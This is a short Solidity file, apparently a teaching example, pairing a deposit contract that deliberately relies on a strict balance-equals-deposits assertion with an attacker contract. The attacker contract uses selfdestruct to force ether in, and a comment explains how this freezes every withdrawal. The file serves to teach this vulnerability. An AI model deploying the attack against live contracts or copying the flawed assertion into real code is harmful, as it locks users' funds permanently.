// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        assert(address(this).balance == totalDeposits);
        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}

contract AttackerSelfDestructMe {
    SelfDestructMe target;

    constructor(SelfDestructMe _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}

/* 
 The contract does not have a receive() or fallback() function,
 so it cannot normally accept ETH sent directly to it.

 The only way to send ETH to the contract is via the deposit() function,
 which updates the internal accounting variables:
 - deposits[msg.sender]
 - totalDeposits

 However, an attacker can use selfdestruct to forcefully send ETH to the contract,
 bypassing the deposit() function entirely.

 This causes the actual ETH balance (address(this).balance) to be greater than totalDeposits,
 which breaks the following assertion in the withdraw() function:
 assert(address(this).balance == totalDeposits);

 Once this invariant is broken, all calls to withdraw() will revert,
 and users will be unable to withdraw their ETH.

 As a result, all user funds become permanently stuck in the contract.
 */
